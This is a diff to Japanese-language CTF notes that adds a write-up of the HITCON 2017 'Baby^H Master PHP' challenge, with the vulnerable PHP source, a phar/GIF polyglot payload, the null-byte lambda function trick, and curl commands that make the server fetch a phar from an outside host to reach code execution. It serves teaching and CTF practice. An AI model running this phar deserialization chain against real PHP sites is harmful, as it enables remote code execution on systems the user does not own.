@@ -1305,9 +1305,112 @@ rename("poc.phar", "poc.jpg");
 ```txt
 http://target/index.php?p=/dashboard/utility/fetchPageInfo/http:%2f%2f[attacker-web-server]:9090%2f
 ```
-##
+## phar with GIF / %00lambda_1 / file_get_contents (hitcon2017 Baby^H Master PHP 2017)
+https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017  
+https://rdot.org/forum/showthread.php?t=4379  
 - **entrypoint**  
+`$data = $_COOKIE["session-data"];`,`unserialize($data);`が一見脆弱っぽいが、`if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac)`で`$data`の署名を検証しているので改竄は無理。  
+`$mode = $_GET["m"];`で`?m=upload`と`?m=show`の二つの機能がある。  
+`upload`関数には`file_get_contents($_GET["url"] . "/avatar.gif");`で任意のURLのコンテンツを取得して`/var/www/data/md5("orange".$_SERVER["REMOTE_ADDR"])`に保存している。  
+`show`関数には`if ( !file_exists($path . "/avatar.gif") )`でそのパスのファイルを読み込んでいる。  
+```php
+ <?php
+    $FLAG    = create_function("", 'die(`/read_flag`);');
+    $SECRET  = `/read_secret`;
+    $SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
+    @mkdir($SANDBOX);
+    @chdir($SANDBOX);
+
+    if (!isset($_COOKIE["session-data"])) {
+        $data = serialize(new User($SANDBOX));
+        $hmac = hash_hmac("sha1", $data, $SECRET);
+        setcookie("session-data", sprintf("%s-----%s", $data, $hmac));
+    }
+
+    class User {
+        public $avatar;
+        function __construct($path) {
+            $this->avatar = $path;
+        }
+    }
+
+    class Admin extends User {
+        function __destruct(){
+            $random = bin2hex(openssl_random_pseudo_bytes(32));
+            eval("function my_function_$random() {"
+                ."  global \$FLAG; \$FLAG();"
+                ."}");
+            $_GET["lucky"]();
+        }
+    }
+
+    function check_session() {
+        global $SECRET;
+        $data = $_COOKIE["session-data"];
+        list($data, $hmac) = explode("-----", $data, 2);
+        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))
+            die("Bye");
+        if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac) )
+            die("Bye Bye");
+
+        $data = unserialize($data);
+        if ( !isset($data->avatar) )
+            die("Bye Bye Bye");
+        return $data->avatar;
+    }
+
+    function upload($path) {
+        $data = file_get_contents($_GET["url"] . "/avatar.gif");
+        if (substr($data, 0, 6) !== "GIF89a")
+            die("Fuck off");
+        file_put_contents($path . "/avatar.gif", $data);
+        die("Upload OK");
+    }
+
+    function show($path) {
+        if ( !file_exists($path . "/avatar.gif") )
+            $path = "/var/www/html";
+        header("Content-Type: image/gif");
+        die(file_get_contents($path . "/avatar.gif"));
+    }
+
+    $mode = $_GET["m"];
+    if ($mode == "upload")
+        upload(check_session());
+    else if ($mode == "show")
+        show(check_session());
+    else
+        highlight_file(__FILE__);
+```
+したがって、`upload`関数で`?url=http://attacker/avatar.gif`としてpharファイルをGIFに偽装してアップロードしておき、また`upload`関数を呼びだすことでこのパスを`?url=phar:///var/www/data/md5("orange".$_SERVER["REMOTE_ADDR"])/avatar.gif`でPHARファイルとして読み込めばRCEのやつができる！  
+`show`でも`if ( !file_exists($path . "/avatar.gif") )`で読み込めそうだが、`$path`は制御できず`phar://`とすることはできないためここでは使えない。  
+Adminクラスには明らかにObject Injectionに使ってくださいと言わんばかりの`__destruct()`がある。  
+以下で`__desturuct`さえ呼びだせればよいのでこれでいい。  
+```txt
+$ cat avatar.gif
+GIF89a<?php __HALT_COMPILER(); ?>
+W O:5:"Admin":1:{s:2:"ip";s:0:"";}   index.pheQFƁ<?php ?>=)Ʀ0*?KbaQGBMB
+```
+`my_function_$random`を呼び出すことができればFlagが表示されるっぽいが、`$random`の値を推測することができない…  
+`$_GET["lucky"]();`もあるが、ここで、``$FLAG    = create_function("", 'die(`/read_flag`);');``でラムダ関数が定義されていることを利用して、`"\x00lambda_1"();`で同じものを実行できる！  
+  
+あと、WriteupにはApache Preforkがどうのこうの書いてるけどよくわからん…  
+新規子プロセスをApacheにforkさせる意味はなんだろうか？？  
+`"\x00lambda_1"();`の数字を`1`と推測するためかな？？？？  
 - **payload**  
+```txt
+# get a cookie
+$ curl http://host/ --cookie-jar cookie
+
+# download .phar file from http://orange.tw/avatar.gif
+$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'
+
+# force apache to fork new process
+$ python fork.py &
+
+# get flag
+$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
+```
 ##
 - **entrypoint**  
 - **payload**  
